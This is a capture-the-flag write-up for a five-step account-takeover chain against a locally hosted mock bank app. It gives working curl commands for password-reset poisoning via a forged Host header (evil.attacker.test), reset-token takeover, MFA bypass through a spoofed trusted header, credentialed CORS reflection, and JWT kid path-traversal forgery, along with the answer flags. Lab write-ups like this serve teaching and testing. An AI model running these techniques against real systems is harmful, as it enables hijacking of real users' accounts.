# ACT II Writeup — Account Takeover Chain (ADNSU31–ADNSU35)

Difficulty: Hard → Expert. Theme: full modern ATO kill-chain. All steps strictly sequential.

## ADNSU31 — Host Header Injection / Password-Reset Poisoning  ⭐⭐⭐⭐
`forgot.php` builds the reset URL from `$_SERVER['HTTP_HOST']` and queues it to a mock relay.
```
curl -H "Host: evil.attacker.test" -d "email=deniz.aydin@novabank.com.tr" \
     http://TARGET/nb-id-recover-a3f9/forgot.php
curl http://TARGET/nb-id-recover-a3f9/mail-log.php    # poisoned entry = flag + token
```
Flag: `ADNSU31{host_header_reset_poisoning_a3f9}`. Yields the victim's valid reset token.
Tests: trusting the Host header for security-relevant link generation.

## ADNSU32 — Account Takeover via Reset Token  ⭐⭐⭐
The leaked token lets anyone set the victim's password; the app then logs you in.
```
curl -c jar -d "token=<TOKEN>&password=pwned123" http://TARGET/nb-id-recover-a3f9/reset.php
curl -b jar http://TARGET/nb-id-recover-a3f9/dash.php     # flag + mfa_ref
```
Flag: `ADNSU32{reset_token_account_takeover_b7e4}`. Yields `mfa_ref = mfaenr-7c21-deniz` + session.
Tests: tokenized password-reset abuse, session establishment.

## ADNSU33 — MFA Bypass (client-trusted gateway header)  ⭐⭐⭐⭐
`verify.php` trusts `X-MFA-Verified` — a header meant to be set only by the internal proxy.
```
curl -b jar -H "Content-Type: application/json" -H "X-MFA-Verified: 1" \
     -d '{"mfa_ref":"mfaenr-7c21-deniz","otp":"0"}' http://TARGET/nb-mfa-gw-7c21/verify.php
```
Flag: `ADNSU33{mfa_client_trust_header_bypass_7c21}`. Yields `api_token` + internal endpoint; marks session MFA-cleared.
Tests: trusting client-supplied "verified" signals / missing server-side MFA enforcement.

## ADNSU34 — CORS Misconfiguration (credentialed origin reflection)  ⭐⭐⭐⭐
`data.php` reflects any `Origin` with `Access-Control-Allow-Credentials: true`.
```
curl -b jar -H "X-Api-Token: <api_token>" -H "Origin: https://evil.attacker.test" \
     http://TARGET/nb-cors-edge-5b8e/data.php
```
Flag: `ADNSU34{cors_credentialed_origin_reflection_5b8e}`. Yields a signed HS256 `session_token`
whose header is `{"alg":"HS256","kid":"keys/hs_main.key",...}` with `role:user`.
Tests: reflecting arbitrary Origin + ACAC:true enabling cross-site credentialed exfiltration.

## ADNSU35 — JWT `kid` Path Traversal / Key Confusion  ⭐⭐⭐⭐⭐
`admin.php` loads the HMAC key from the file named in the JWT `kid` header with no sanitisation.
The real key (`keys/hs_main.key`) is web-blocked, so repoint `kid` at a readable file you know:
```
# bytes of the readable file become the signing key
key = GET /nb-jwks-vault-9d4c/static/cdn-cache.txt   # "novabank-static-cdn-cache-manifest-v1"
# forge {"alg":"HS256","kid":"static/cdn-cache.txt"} . {"role":"admin"} signed with HMAC(key)
curl -H "Authorization: Bearer <forged>" http://TARGET/nb-jwks-vault-9d4c/admin.php
```
Flag: `ADNSU35{jwt_kid_path_traversal_key_confusion_9d4c}`.
Tests: JWT `kid` header injection → attacker-controlled key → HMAC key confusion → admin forge.

---
All five verified end-to-end against `php -S` on this repo. State is auto-seeded; delete
`nb-id-recover-a3f9/act2.sqlite*` to reset.
